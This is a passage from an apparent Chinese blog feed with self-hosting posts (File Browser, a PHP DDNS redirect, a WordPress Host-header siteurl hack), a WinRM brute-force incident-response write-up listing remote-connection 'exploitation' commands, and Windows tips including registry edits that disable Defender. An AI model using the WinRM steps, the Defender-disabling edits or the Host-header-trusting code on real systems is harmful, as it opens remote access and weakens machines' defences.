    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/filebrowser/filebrowser">https://github.com/filebrowser/filebrowser</a></p><h1 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h1><p>创建数据库&#x2F;初始化</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">filebrowser<span class="hljs-selector-class">.exe</span> -d filebrowser<span class="hljs-selector-class">.db</span> config init<br></code></pre></td></tr></table></figure><p>设置访问地址IP，写内网的实际IP地址（默认127.0.0.1）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">filebrowser.exe -d filebrowser.db<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> --address 0.0.0.0<br></code></pre></td></tr></table></figure><p>设置监听端口(默认8080)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">filebrowser.exe -d filebrowser.db<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> --port 8000<br></code></pre></td></tr></table></figure><p>设置中文语言环境</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">filebrowser.exe -d filebrowser<span class="hljs-meta">.db</span> config <span class="hljs-keyword">set</span> --locale <span class="hljs-built_in">zh</span>-cn<br></code></pre></td></tr></table></figure><p>设置日志文件位置</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">filebrowser.exe -<span class="hljs-keyword">d</span> filebrowser.<span class="hljs-keyword">db</span> config <span class="hljs-keyword">set</span> --<span class="hljs-keyword">log</span> filebrowser.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><p>设置网盘的根目录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">filebrowser.exe -d filebrowser.db<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> --root  D:\<br></code></pre></td></tr></table></figure><p>添加用户&#x2F;首先添加管理员用户</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">filebrowser.exe -d filebrowser.db users <span class="hljs-keyword">add</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span> <span class="hljs-comment">--perm.admin</span><br></code></pre></td></tr></table></figure><h1 id="进阶配置"><a href="#进阶配置" class="headerlink" title="进阶配置"></a>进阶配置</h1><h2 id="配置SSL证书开启https"><a href="#配置SSL证书开启https" class="headerlink" title="配置SSL证书开启https"></a>配置SSL证书开启https</h2><p>配置证书</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">filebrowser.exe -d filebrowser.db config set --cert D:\<span class="hljs-built_in">Server</span>\SSL\nginx\xxx.pem<br></code></pre></td></tr></table></figure><p>配置密钥</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">filebrowser.exe -d filebrowser.db config set --key D:\<span class="hljs-built_in">Server</span>\SSL\nginx\xxx.key<br></code></pre></td></tr></table></figure><h2 id="注册成服务开机自启动"><a href="#注册成服务开机自启动" class="headerlink" title="注册成服务开机自启动"></a>注册成服务开机自启动</h2><p>项目地址：<a href="https://github.com/winsw/winsw">https://github.com/winsw/winsw</a></p><p>配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>filebrowser<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>filebrowser<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>filebrowser<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">executable</span>&gt;</span>filebrowser<span class="hljs-tag">&lt;/<span class="hljs-name">executable</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">onfailure</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;restart&quot;</span> <span class="hljs-attr">delay</span>=<span class="hljs-string">&quot;60 sec&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">logmode</span>&gt;</span>reset<span class="hljs-tag">&lt;/<span class="hljs-name">logmode</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打开cmd，安装服务</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">winsw.exe <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p>win+r 键入 <code>services.msc</code></p><p>找到filebrowser服务启动即可</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>零成本搭建ddns（IP版）</title>
    <link href="/2024/05/13/WEB/%E9%9B%B6%E6%88%90%E6%9C%AC%E6%90%AD%E5%BB%BAddns%EF%BC%88IP%E7%89%88%EF%BC%89/"/>
    <url>/2024/05/13/WEB/%E9%9B%B6%E6%88%90%E6%9C%AC%E6%90%AD%E5%BB%BAddns%EF%BC%88IP%E7%89%88%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p>当你在自家搭建一个个人服务器，并且哭爹求奶的弄到了一个动态公网ip，但无奈囊中羞涩没钱买域名（又或者说出于其它原因不想用自己的域名），更没钱购买昂贵的ddns服务，免费的ddns又有诸多限制不好用。但是动态公网ip又一直在变，如何能实现出门在外随时随地能访问到自家的服务器呢？</p><p>实现方法是先白嫖一个花生壳免费域名做指引，在每次访问的时候，将url的花生壳域名直接跳转到对应的公网ip上，这样又绕过了花生壳的服务，又能够精准定位到当前的公网ip上。实现了最小成本的ddns，完成曲线救国弯道超车！！</p><p>前提是必须要有公网的动态ipv4地址</p><h1 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h1><p>首先我们先按照花生壳的教程配置好ddns，确保能通过花生壳域名正常解析到我们的服务器上</p><p>然后正常通过花生壳提供的免费ddns访问的url是这样：<a href="https://huashengke.cn.vip:8080/">https://huashengke.cn.vip:8080</a></p><p>而花生壳每个月免费流量只有几个G，并且网速也有限制，如果你长时间这样用花生壳的域名来访问，免费的套餐肯定是无法满足个人使用的</p><p>而经过跳转之后就变成了这样：<a href="https://110.242.68.66:8080/">https://110.242.68.66:8080</a></p><p>经过跳转之后，后续所有的流量就直接通过ip来进行通讯。绕过了花生壳的域名和服务，自然也就不再有流量焦虑，而网速也不再会受到花生壳的限制。又能够精准定位到服务器当前的动态公网ip上</p><p>这样我们每次访问只有第一个数据包用到花生壳的域名网络，然后第二个包就马上跳转到ip了，也就是每次访问只消耗花生壳一个数据包的流量，而一个包消耗的流量几乎可以忽略不记，甚至很多人一起用都没问题。这样就实现了最小成本的ddns</p><blockquote><p>ps：家用宽带运营商一般默认禁用80和443端口，需要更改为其他端口</p></blockquote><h1 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h1><p>一般有以下两种情况</p><ol><li>想映射出去的服务不是php-web项目，那就在自己的服务上搭建一个php+nginx服务环境，用下面第2点的php代码新建个index.php文件，利用nginx把公网端口的流量转发到内网端口。</li></ol><blockquote><p>示例：如需要在公网通过88端口进行访问，想映射出去的内网端口是5000端口，则用nginx监听88端口，转发到内网5000端口。</p></blockquote><p><strong>nginx配置</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">88</span>;    <span class="hljs-comment"># 监听的公网端口</span><br>  <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">88</span>;<span class="hljs-comment"># 监听的公网端口</span><br><br><br>  <span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">proxy_pass</span> http://10.0.0.8:5000;<span class="hljs-comment">#流量转发到该内网ip端口</span><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ol><li>如果想映射出去的刚好是php-web项目，就直接编辑现有的index.php，在文件顶部添加下面的代码即可。</li></ol><p><strong>php代码</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ip = file_get_contents(<span class="hljs-string">&quot;http://v4.ident.me&quot;</span>);    <span class="hljs-regexp">//</span>访问网址http:<span class="hljs-regexp">//</span>v4.ident.me获取当前服务器的公网ip<br>$ipaddr = <span class="hljs-string">&quot;http://&quot;</span>.$ip.<span class="hljs-string">&quot;:88&quot;</span>;                    <span class="hljs-regexp">//</span>定义跳转的url，<span class="hljs-number">88</span>端口可按需更改<br><br>$current_url = <span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>];   <span class="hljs-regexp">//url</span>拼接<br><br><span class="hljs-keyword">if</span> ($current_url != $ipaddr) &#123;<br>  header(<span class="hljs-string">&quot;Location:$ipaddr&quot;</span>);                     <span class="hljs-regexp">//</span>开始跳转，套个<span class="hljs-keyword">if</span>条件防止无限跳转<br>&#125;<br><br></code></pre></td></tr></table></figure><p>以下是在wordpress站点的首页index文件改造示例，直接把代码加在顶部就行</p><p><img src="/2024/05/13/WEB/%E9%9B%B6%E6%88%90%E6%9C%AC%E6%90%AD%E5%BB%BAddns%EF%BC%88IP%E7%89%88%EF%BC%89/image.png" alt="alt text"></p><p>弄好之后，我们每次就直接访问花生壳的域名，然后url就会马上自动跳转到对应的公网ip上，对我们操作几乎是无感知的，不会有任何影响</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ddns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wordpress动态更改“固定链接”</title>
    <link href="/2024/05/13/WEB/wordpress%E5%8A%A8%E6%80%81%E6%9B%B4%E6%94%B9%E2%80%9C%E5%9B%BA%E5%AE%9A%E9%93%BE%E6%8E%A5%E2%80%9D/"/>
    <url>/2024/05/13/WEB/wordpress%E5%8A%A8%E6%80%81%E6%9B%B4%E6%94%B9%E2%80%9C%E5%9B%BA%E5%AE%9A%E9%93%BE%E6%8E%A5%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>wordpress有两个固定链接，定义了站点的访问url，以及各种媒体文件的超链接等。当我们是用动态公网ip来访问wordpress的时候，因为是动态ip的缘故，公网ip可能会一直变，但是这个wordpress的固定链接不会变，就会导致我们的公网ip每变一次，就访问不了wordpress，然后就要上数据库去改那两个固定链接对应的字段（wp_options数据库的siteurl和home字段）。这样对我们这些家庭服务器玩家来说也太不友好了，这该怎么办呢？</p><h1 id="固定链接关系阐述"><a href="#固定链接关系阐述" class="headerlink" title="固定链接关系阐述"></a>固定链接关系阐述</h1><p>WordPress地址（URL）<br>是WordPress文件和文件夹存储的地址，包括您的管理页面，插件，主题，媒体文件，媒体文件的超链接等。对应wp_options数据库内“option_name”的“siteurl“字段。</p><p>站点地址（URL）<br>是您网站的面向公众的部分。这是您的访问者将输入的内容，以访问您的网站。对应wp_options数据库内“option_name”的“home“字段。</p><p>WordPress程序文件安装在子目录aaa下，那么WordPress地址应填写为<a href="https://xxx.com/aaa%EF%BC%8C%E8%AE%BF%E9%97%AE%E7%BD%91%E5%9D%80%E5%8F%AF%E4%BB%A5%E6%98%AFhttps://xxx.com%EF%BC%8C%E9%82%A3%E4%B9%88%E7%AB%99%E7%82%B9%E5%9C%B0%E5%9D%80%E5%BA%94%E5%A1%AB%E5%86%99%E4%B8%BAhttps://xxx.com%E3%80%82">https://xxx.com/aaa，访问网址可以是https://xxx.com，那么站点地址应填写为https://xxx.com。</a></p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>编辑wordpress项目的option.php文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">vim <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wp-<span class="hljs-keyword">includes</span>/option.php<br></code></pre></td></tr></table></figure><p>在最上方添加如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_option</span>(<span class="hljs-params"> <span class="hljs-variable">$option</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">false</span> </span>) </span>&#123;             <span class="hljs-comment">//自己写一个get_option函数</span><br>    <span class="hljs-variable">$my_option</span>=<span class="hljs-title function_ invoke__">my_get_option</span>(<span class="hljs-variable">$option</span>,<span class="hljs-variable">$default</span>);             <span class="hljs-comment">//调用原来的函数</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$option</span>==<span class="hljs-string">&quot;siteurl&quot;</span> || <span class="hljs-variable">$option</span> == <span class="hljs-string">&quot;home&quot;</span>)&#123;            <span class="hljs-comment">//针对siteurl和home做修改，其他不变</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>]!=<span class="hljs-string">&quot;www.xxx.cn&quot;</span>)&#123;         <span class="hljs-comment">//如果不是用域名访问的</span><br>        <span class="hljs-variable">$my_option</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>]; <span class="hljs-comment">//就跳转到当前URL里的服务器地址，比如本地的localhost或局域网访问的192.168.1.100</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$my_option</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_get_option</span>(<span class="hljs-params"> <span class="hljs-variable">$option</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">false</span> </span>) </span>&#123; <span class="hljs-comment">//更改第一行的get_option为my_get_option</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/13/WEB/wordpress%E5%8A%A8%E6%80%81%E6%9B%B4%E6%94%B9%E2%80%9C%E5%9B%BA%E5%AE%9A%E9%93%BE%E6%8E%A5%E2%80%9D/image.png" alt="alt text"></p><p>这样就可以实现，每次访问wordpress，wordpress就会自动检测请求头的host字段ip，然后跟着host请求头里的ip更改那两个固定链接，这样这两个烦人的固定链接就会动态的跟着我们的公网ip变化而自动变化了</p><h1 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h1><p>后来我又发现一个问题，就是文章里的媒体文件（如图片）是用超链接显示的，媒体文件的超链接里的ip不会自动变化，文章的图片会因为ip的变动而失效，影响阅读。目前我还没有想到很好的解决办法。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wordpress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次5986端口应急响应</title>
    <link href="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <url>/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的主机今天登录突然发现报错”登录错误太多次账户被锁定“，我突然感觉纳闷，我平常都是在我自己电脑保存密码，每次登录都是默认登录，不存在登录失败，难道被攻击了？话不多说立马展开排查</p><h1 id="暴露面检查"><a href="#暴露面检查" class="headerlink" title="暴露面检查"></a>暴露面检查</h1><p>因为我在openwrt上映射了5000-10000的端口上互联网，避开了smb，rdp等危险端口，理论上来说不应该能被爆破。</p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image.png" alt="alt text"></p><h1 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h1><p>在排查主机日志的时候发现有登录失败日志</p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-1.png" alt="alt text"></p><h1 id="威胁确认"><a href="#威胁确认" class="headerlink" title="威胁确认"></a>威胁确认</h1><p>查了下是个外省的ip，被标记恶意了</p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-2.png" alt="alt text"></p><h1 id="入口排查"><a href="#入口排查" class="headerlink" title="入口排查"></a>入口排查</h1><p>再根据主机排查连接的端口，发现该恶意ip正在尝试连接我的5985端口</p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-3.png" alt="alt text"></p><h1 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h1><p>有点懵逼，没见过这个端口，后来在问了下度娘，发现是个远程控制端口，艹</p><p><strong>5985端口</strong></p><blockquote><p>WinRM是Windows Remote Managementd（Windows远程管理）的简称。它基于Web服务管理(WebService-Management)标准，WinRM2.0默认端口5985&#x2F;tcp (HTTP)、5986&#x2F;tcp (HTTPS)。如果所有的机器都是在域环境下，则可以使用默认的5985端口，否则的话需要使用HTTPS传输(5986端口)。使用WinRM我们可以在对方有设置防火墙的情况下远程管理这台服务器，因为启动WinRM服务后，防火墙默认会放行5985端口。WinRM服务在Windows Server 2012以上服务器自动启动。在WindowsVista上，服务必须手动启动。WinRM的好处在于，这种远程连接不容易被察觉到，也不会占用远程连接数！</p></blockquote><p><strong>利用方式</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment">#开启服务</span><br><span class="hljs-string">enable-psremoting</span><br><br><span class="hljs-comment">#设置信任主机</span><br><span class="hljs-built_in">set-item</span> <span class="hljs-string">wsman</span>:\<span class="hljs-string">localhost</span>\<span class="hljs-string">Client</span>\<span class="hljs-string">TrustedHosts</span> -<span class="hljs-string">value</span> <span class="hljs-string">192</span>.<span class="hljs-string">168</span>.<span class="hljs-string">52</span>.<span class="hljs-string">143</span><br><br><span class="hljs-comment">#连接</span><br><span class="hljs-string">winrs</span> ‐<span class="hljs-string">r:192.</span><span class="hljs-string">168</span>.<span class="hljs-string">52</span>.<span class="hljs-string">143</span> ‐<span class="hljs-string">u</span>:账户 ‐<span class="hljs-string">p</span>:密码<br></code></pre></td></tr></table></figure><h1 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h1><p>赶紧排查一波我还监听有什么开放端口，还发现两个5357和6443端口，6443是我自己开的的webdav端口</p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-6.png" alt="alt text"></p><p><strong>5357端口</strong></p><blockquote><p>该端口对应着<code>FunctionDiscoveryResourcePublication</code>服务，它的含义是发布该计算机以及连接到该计算机的资源，以便能够在网络上发现这些资源。该端口的开启可能会造成计算机内部信息的泄露，因此需要关闭该端口，也就是禁用<code>FunctionDiscoveryResourcePublication</code>服务</p></blockquote><h1 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h1><h2 id="禁用服务"><a href="#禁用服务" class="headerlink" title="禁用服务"></a>禁用服务</h2><p><strong>WinRM</strong></p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-4.png" alt="alt text"></p><p><strong>FunctionDiscoveryResourcePublication</strong></p><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-7.png" alt="alt text"></p><h2 id="防火墙拦截"><a href="#防火墙拦截" class="headerlink" title="防火墙拦截"></a>防火墙拦截</h2><p><img src="/2024/05/13/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E4%B8%80%E6%AC%A15986%E7%AB%AF%E5%8F%A3%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-5.png" alt="alt text"></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows随记</title>
    <link href="/2024/05/10/%E7%B3%BB%E7%BB%9F/windows/windows%E9%9A%8F%E8%AE%B0/"/>
    <url>/2024/05/10/%E7%B3%BB%E7%BB%9F/windows/windows%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="win注册表start键值说明"><a href="#win注册表start键值说明" class="headerlink" title="win注册表start键值说明"></a>win注册表start键值说明</h1><table><thead><tr><th align="left">键值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">默认开机bios启动而启动</td></tr><tr><td align="left">1</td><td align="left">跟随操作系统启动</td></tr><tr><td align="left">2</td><td align="left">自动启动</td></tr><tr><td align="left">3</td><td align="left">手动启动</td></tr><tr><td align="left">4</td><td align="left">禁用</td></tr></tbody></table><h1 id="KMS激活"><a href="#KMS激活" class="headerlink" title="KMS激活"></a>KMS激活</h1><p>安装对应版本的<a href="https://learn.microsoft.com/zh-cn/windows-server/get-started/kms-client-activation-keys?tabs=server2022,windows10ltsc,version1803,windows81">产品密钥</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">slmgr /ipk <span class="hljs-tag">&lt;<span class="hljs-name">产品密钥</span>&gt;</span><br></code></pre></td></tr></table></figure><p>设置kms服务器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">slmgr /skms <span class="hljs-tag">&lt;<span class="hljs-name">kms服务器</span>&gt;</span><br></code></pre></td></tr></table></figure><p>手动激活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">slmgr /ato<br></code></pre></td></tr></table></figure><p>查看激活信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">slmgr<span class="hljs-selector-class">.vbs</span> -dlv<br></code></pre></td></tr></table></figure><p>更多参考：</p><p><a href="https://learn.microsoft.com/zh-cn/windows-server/get-started/kms-client-activation-keys?tabs=server2022,windows10ltsc,version1803,windows81">密钥管理服务 (KMS) 客户端激活和产品密钥</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-server/get-started/upgrade-conversion-options">适用于 Windows Server 的升级和转换选项</a></p><h1 id="显示桌面“我的电脑”"><a href="#显示桌面“我的电脑”" class="headerlink" title="显示桌面“我的电脑”"></a>显示桌面“我的电脑”</h1><p>win+r运行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rundll32<span class="hljs-selector-class">.exe</span> shell32<span class="hljs-selector-class">.dll</span>,Control_RunDLL desk<span class="hljs-selector-class">.cpl</span>,,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="关闭Windows-Defender（安全中心）"><a href="#关闭Windows-Defender（安全中心）" class="headerlink" title="关闭Windows Defender（安全中心）"></a>关闭Windows Defender（安全中心）</h1><p>win+r：regedit</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService<br></code></pre></td></tr></table></figure><p>修改start值为4（禁用）</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wscsvc<br></code></pre></td></tr></table></figure><p>修改start值为4（禁用）</p><h1 id="禁用windows自动更新"><a href="#禁用windows自动更新" class="headerlink" title="禁用windows自动更新"></a>禁用windows自动更新</h1><p>win+r：regedit</p><p>Windows Update（修改stat值为4禁用）</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsoSvc<br></code></pre></td></tr></table></figure><p>Windows 更新医生服务（修改stat值为4禁用）</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc<br></code></pre></td></tr></table></figure><p>修改FailureActions键，修改010和018左起第5个值为00</p><p><img src="/2024/05/10/%E7%B3%BB%E7%BB%9F/windows/windows%E9%9A%8F%E8%AE%B0/fcf72bad0d8ebea5682c834c31937f70-1.png" alt="alt text"></p><h1 id="解决windows系统显示SATA盘为可弹出设备"><a href="#解决windows系统显示SATA盘为可弹出设备" class="headerlink" title="解决windows系统显示SATA盘为可弹出设备"></a>解决windows系统显示SATA盘为可弹出设备</h1><ol><li>windows+R 输入regedit打开注册表，定位到</li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKLM\SYSTEM\CurrentControlSet\Services\storahci\Parameters\Device<br></code></pre></td></tr></table></figure><p>新建”多字符串值”，命名为”TreatAsInternalPort”。</p><ol start="2"><li><p>打开设备管理器，查看磁盘驱动的硬盘位置。</p></li><li><p>在 <code>TreatAsInternalPort</code> 的 <code>值</code> 里竖着写上自己的硬盘端口号，写完后要在最后加一个回车。</p></li></ol><h1 id="打开隐藏的电源计划"><a href="#打开隐藏的电源计划" class="headerlink" title="打开隐藏的电源计划"></a>打开隐藏的电源计划</h1><ol><li>命令 <code>powercfg/L</code> 可以看到当前系统存在的电源方案，带星号的正在用的方案</li><li>命令 <code>powercfg/ALIASES</code> 可以看到所有系统内置的电源方案</li><li>命令 <code>powercfg/S SCHEME_MIN</code> 就可以使用高性能方案了</li><li>SCHEME_MAX (省电)、SCHEME_MIN (高性能) 和 SCHEME_BALANCED (平衡)</li></ol><h1 id="改变用户管理员角色属性"><a href="#改变用户管理员角色属性" class="headerlink" title="改变用户管理员角色属性"></a>改变用户管理员角色属性</h1><p>win+r：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><span class="hljs-section">control</span> userpasswords2<br></code></pre></td></tr></table></figure><p>用户 -&gt; 属性 -&gt; 